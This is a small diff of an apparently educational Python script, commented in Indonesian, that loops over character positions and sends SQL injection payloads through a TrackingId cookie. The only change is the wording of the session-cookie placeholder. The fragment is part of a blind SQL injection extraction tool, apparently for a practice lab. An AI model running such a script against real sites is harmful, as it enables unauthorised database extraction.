@@ -26,7 +26,7 @@ for position in range(1, 21):
         # mendeteksi SQLi lewat Cookie TrackingId
         cookies = {
             "TrackingId": payload,
-            "session": "GANTI_DENGAN_SESSION_COOKIE_KAMU" # Lihat di Storage/Application Burp Suite
+            "session": "GANTI_DENGAN_SESSION_COOKIE_YG_KEMUNGKINAN_VULN" # Lihat di Storage/Application Burp Suite
         }
         
         # Kirim request ke server
